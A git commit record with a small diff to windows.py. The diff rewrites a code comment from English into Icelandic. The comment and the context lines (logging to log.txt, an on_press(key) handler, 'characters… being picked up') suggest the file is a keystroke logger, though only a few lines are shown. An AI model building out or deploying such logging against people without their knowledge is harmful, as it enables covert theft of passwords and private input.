68d646592208d0368c355fa49b76dacbc29eb3ec
Viktor Þór Freysson <viktorthorr@gmail.com>
2020-04-03 21:06:37 +0000

    Snyrting

--- windows.py
+++ windows.py
@@ -6,9 +6,8 @@ import logging
 
 log_dir = ""
 
-# Probably best to simply removing logging all together and replace logging.info with
-# file write statements (after open()). I would recommend opening the file in append
-# mode on each write so you can see characters in the file while they are being picked up.
+# Sennilega best að fjarlægja "logging" dæmið alveg og nota
+# file write statements eftir open() eins og linux meginn.
 logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG, format='%(message)s')
 
 def on_press(key):
